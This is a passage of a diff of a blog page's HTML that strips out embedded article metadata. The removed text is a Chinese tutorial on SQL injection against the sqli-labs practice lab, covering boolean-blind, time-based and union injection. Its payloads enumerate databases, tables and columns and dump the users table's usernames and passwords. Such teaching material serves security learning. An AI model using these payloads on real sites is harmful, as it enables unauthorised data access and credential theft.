-爆出4个表，选择爆users表
--1&#39; union select 1,(select group_concat(column_name)from information_schema.columns where table_name=&#39;users&#39;),3 --+
-
-发现查询出了很多字段应该爆错了不是我们需要的那个表，可能其他库里也有users表，这样要加一条限制语句，查security库里的users表
--1&#39; union select 1,(select group_concat(column_name)from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),3 --+
-
-爆字段的数据
--1&#39; union select 1,(select group_concat(id,username,password) from users),3 --+
-
-12345-1&#x27; union select 1,(select database()),3 --+-1&#x27; union select 1,(select group_concat(table_name)from information_schema.tables where table_schema=database()),3 --+-1&#x27; union select 1,(select group_concat(column_name)from information_schema.columns where table_name=&#x27;users&#x27;),3 --+-1&#x27; union select 1,(select group_concat(column_name)from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),3 --+-1&#x27; union select 1,(select group_concat(id,username,password) from users),3 --+"
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2023/03/24/%E5%B8%B8%E8%A7%81sql%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93%E4%B8%8E%E6%8A%80%E5%B7%A7-%E4%B8%80/&title=常见sql注入手法总结与技巧(一) - GhostToKnow&summary="
           
           >
           
@@ -3625,7 +3320,7 @@ union联合注入第一步，测试注入点，一些小技巧：利用引号，
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"GhostToKnow","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"GhostToKnow","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"GhostToKnow"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/SQL注入/","name":"SQL注入"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2023/03/24/常见sql注入手法总结与技巧-一/","name":"常见sql注入手法总结与技巧(一)"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"GhostToKnow","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"GhostToKnow","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"GhostToKnow","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"常见sql注入手法总结与技巧(一)","description":"前言SQL 是 Structured Query Language 的缩写，中文译为“结构化查询语言”。SQL 是一种计算机语言，用来存储、检索和修改关系型数据库中存储的数据。\nsql注入是最为常见也是破坏力很大的漏洞，它是因为开发在开发时没有对用户的输入行为进行判断和过滤，使得用户输入了恶意语句后传给了后端数据库进行相应的动作（如增删改查甚至写后门）。\n根本产生原因：后端服务器接收传来的参数未经过严格过滤判断而直接进入数据库查询\n所以在学习SQL注入前需要了解SQL基础语法\nSQL注入根源分析如果后台sql语句为：\n1$sql=&quot;SELECT * FROM users WHERE id=&#x27; $id &#x27; LIMIT 0,1&quot;;\n\n如果我们传入id&#x3D;1’  那么如果后端没有经过过滤而是直接把我们传入的参数带进sql语句中，那么sql语句就会变成：\n1$sql=&quot;SELECT * FROM users WHERE id=&#x27;1&#x27;&#x27; LIMIT 0,1&quot;;\n\n我们传入的 ‘ 就会一块带入和前面的单引号进行闭合，导致原来后面的单引号就多余，而sql语句引号是必须成对出现的就会报错什么都查不出来，但如果我们在1’后面加入恶意语句并且把后面的原来的语句进行注解，就会造成sql语句会执行我们传入的恶意语句，实现注入。\n12id = -1&#x27; union select database() #$sql=&quot;SELECT * FROM users WHERE id=&#x27;-1&#x27; union select database() #&#x27; LIMIT 0,1&quot;;\n\n-1表示查询一个不存在的id，是为了不影响后面我们的注入语句\n#,–+,– 表示注释，把后面所有语句注释掉，这样就不会影响我们的注入语句\nsql参数类型分类SQL注入按照参数类型分类可分为两种：数字型和字符型\n\n数字型：select * from table where id&#x3D;2\n字符型：select * from table where id&#x3D;’2’\n\n区别在于数字型不需要单引号进行闭合，而字符型一般需要通过单引号闭合。\n判断类型方法：\n​\t构造payload为：id=1 order by 9999 --+\n如果正确返回页面，则为字符型；否则，为数字型\n​\t构造payload为：1 and 1=2\n如果正确返回页面，则为字符型；否则，为数字型\n常见sql注入手法这里先给出常用的payload，后面会使用到\n1234567select database()select group_concat(table_name)from information_schema.tables where table_schema=database()select group_concat(column_name)from information_schema.columns where table_name=&#x27;xxxx&#x27;select group_concat(字段名) from 表名\n\n常见注入手法分类布尔盲注\n时间盲注\nunion联合注入\n报错注入\n堆叠注入\n二次注入\n宽字节注入\n通过sql注入写webshell\n通过http header注入\n…\n盲注通常根据SQL注入是否有回显将其分为有回显的注入和无回显的注入，其中无回显的注入就是盲注。\n我们的注入语句可能会让网页呈现两种状态，例如“查询成功”，“查询失败”，相当于true和false。也可能是一句“查询完成”或者什么都不说。虽然并不能直接得到数据库中的具体数据，但是SQL语句的拼接已经发生了，非法的SQL也执行了，SQL注入攻击就发生了，只是SQL注入的结果不能直接拿到。\n盲注就是针对这种无回显的情况，盲注就像是爆破，在进行SQL盲注时，大致过程为：\n12345678如果&quot;数据库XX&quot;的第一个字母是a，就返回“查询成功”，否则返回“查询失败”如果&quot;数据库XX&quot;的第一个字母是b，就返回“查询成功”，否则返回“查询失败”如果&quot;数据库XX&quot;的第一个字母是c，就返回“查询成功”，否则返回“查询失败”...如果&quot;数据库XX&quot;的第二个字母是a，就返回“查询成功”，否则返回“查询失败”如果&quot;数据库XX&quot;的第二个字母是b，就返回“查询成功”，否则返回“查询失败”如果&quot;数据库XX&quot;的第二个字母是c，就返回“查询成功”，否则返回“查询失败”...\n\n通过这样不断的测试爆破，根据回显的“查询成功”和“查询失败”，判断出具体数据的每一位是什么，就可以完整的得到这个数据的具体值了。\n布尔盲注下面使用sqli-labs靶场演示,less-8关\n查询成功返回You are in….\n\n而查询失败则什么都不显示\n\n返回You are in….相当于是“查询成功”，而什么都没显示则相当于是“查询失败”。所以我们构造的判断语句，可以根据页面是否有You are in….来充当判断条件。\n要使用的sql函数：\nsubstr(要截取的字符串，从哪一位开始截取，截取多长)\nascii()返回传入字符串的首字母的ASCII码\n获取当前数据库名\n12345678910111213141.判断当前数据库名的长度id=1&#x27; and length(database())=8 --+  //有回显判断到等于8时出现You are in....说明语句执行正确，当前数据库长度为8个字符2.判断当前数据库名//判断数据库的第一个字符id=1&#x27; and ascii(substr(database(),1,1))=115 --+//判断数据库的第二个字符id=1&#x27; and ascii(substr(database(),2,1))=101 --+//判断数据库的第三个字符id=1&#x27; and ascii(substr(database(),3,1))=99 --+...数据库为 security\n\n获取当前库的表名\n123456789判断每个表名的每个字符的ascii值//判断第一个表的第一个字符id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101 --+//判断第一个表的第二个字符id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=109 --+...判断出存在表 emails、referers、uagents、users \n\n获取表的字段\n123456789猜测users表比较重要，先查询users表//判断第一个字段的第一个字符id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1))=117 --+//判断第一个字段的第二个字符id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),2,1))=115 --+...users表中存在 id、username、password 字段\n\n获取字段中的数据\n12345//判断id字段的第一行数据的第一个字符id=1&#x27; and ascii(substr((select id from users limit  0,1),1,1))=100 --+//判断id字段的第二行数据的第二个字符id=1&#x27; and ascii(substr((select id from users limit 0,1),2,1))=100 --+...\n\n手工去盲注太过繁琐，不建议手工注入，可借助工具或者写脚本跑\n时间盲注时间盲注也叫延迟注入。在页面没有回显数据，也没有可以充当判断条件的地方，也没有报错信息，就可以考虑尝试时间盲注。时间盲注就是将页面的反响时间作为判断依据，来注入出数据库的信息。\n以Less-9为例，当我们以id&#x3D;1’ and sleep(5) –+ 进行注入，可以明显的感觉到页面返回响应的时间变长了，大概拉长了5秒左右，这说明构造的sleep(5)语句起作用了。我们可以把这个当作判断依据，配合if语句使用。\nif(a,b,c) 如果a的值为true，则返回b的值，如果a的值为false，则返回c的值。\n获取数据库名\n123456//查询数据库名第一个字符id=1&#x27; and if(ascii(substr(database(),1,1))= 115,sleep(5),0) --+明显感受到页面延迟了几秒，说明数据库名字第一个字符是s。//查询数据库名第二个字符id=1&#x27; and if(ascii(substr(database(),2,1))= 101,sleep(5),0) --+...\n\n与盲注类似，后面就是爆破字符，再爆表名，字段名，具体数据。\n不建议手注，建议编写脚本或使用工具\nunion联合注入第一步，测试注入点，一些小技巧：利用引号，and 1&#x3D;1 ，or 1&#x3D;1 等判断是字符型还是数字型\n\n正常返回判断是字符型\n第二步，利用order by 查表得到到字段个数\n\n\n查到3时正常返回但到4时报错说明当前表中只有三列\n第三步，利用union select 1,2,3..判断回显位，如果有回显，找到回显位，回显位也就是回显页面有我们设置的1,2,3的位置\n\n发现者里有2和3的回显位,在name和Password回显\n第四步，爆库，爆表，爆字段名，爆值\n为什么用-1 ：因为-1大概率会返回空表，union select联合查询会返回一张表，就只会显示后面联合查询表\n组合使用上面提到的常用的payload，放在页面回显位上\n-1&#39; union select 1,(select database()),3 --+\n\n-1&#39; union select 1,(select group_concat(table_name)from information_schema.tables where table_schema=database()),3 --+\n\n爆出4个表，选择爆users表\n-1&#39; union select 1,(select group_concat(column_name)from information_schema.columns where table_name=&#39;users&#39;),3 --+\n\n发现查询出了很多字段应该爆错了不是我们需要的那个表，可能其他库里也有users表，这样要加一条限制语句，查security库里的users表\n-1&#39; union select 1,(select group_concat(column_name)from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),3 --+\n\n爆字段的数据\n-1&#39; union select 1,(select group_concat(id,username,password) from users),3 --+\n\n12345-1&#x27; union select 1,(select database()),3 --+-1&#x27; union select 1,(select group_concat(table_name)from information_schema.tables where table_schema=database()),3 --+-1&#x27; union select 1,(select group_concat(column_name)from information_schema.columns where table_name=&#x27;users&#x27;),3 --+-1&#x27; union select 1,(select group_concat(column_name)from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),3 --+-1&#x27; union select 1,(select group_concat(id,username,password) from users),3 --+","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2023/03/24/%E5%B8%B8%E8%A7%81sql%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93%E4%B8%8E%E6%8A%80%E5%B7%A7-%E4%B8%80/"},"author":{"@type":"Person","name":"GhostToKnow","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"GhostToKnow","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2023/03/24/%E5%B8%B8%E8%A7%81sql%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93%E4%B8%8E%E6%8A%80%E5%B7%A7-%E4%B8%80/","wordCount":5682,"datePublished":"2023-03-24T11:48:48.000Z","dateModified":"2023-03-29T13:06:44.858Z","articleSection":"SQL注入","keywords":"SQL注入,安全基础","image":{"@type":"ImageObject","url":"https://s3.bmp.ovh/imgs/2023/03/24/6684ceec581ed885.png","width":1024,"height":768}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"GhostToKnow","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"GhostToKnow","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"GhostToKnow"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/SQL注入/","name":"SQL注入"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2023/03/24/常见sql注入手法总结与技巧-一/","name":"常见sql注入手法总结与技巧(一)"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"GhostToKnow","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"GhostToKnow","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"GhostToKnow","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"常见sql注入手法总结与技巧(一)","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2023/03/24/%E5%B8%B8%E8%A7%81sql%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93%E4%B8%8E%E6%8A%80%E5%B7%A7-%E4%B8%80/"},"author":{"@type":"Person","name":"GhostToKnow","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"GhostToKnow","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2023/03/24/%E5%B8%B8%E8%A7%81sql%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93%E4%B8%8E%E6%8A%80%E5%B7%A7-%E4%B8%80/","wordCount":0,"datePublished":"2023-03-24T11:48:48.000Z","dateModified":"2023-03-29T13:20:40.806Z","articleSection":"SQL注入","keywords":"SQL注入,安全基础","image":{"@type":"ImageObject","url":"https://s3.bmp.ovh/imgs/2023/03/24/6684ceec581ed885.png","width":1024,"height":768}}]</script>
 
 
 
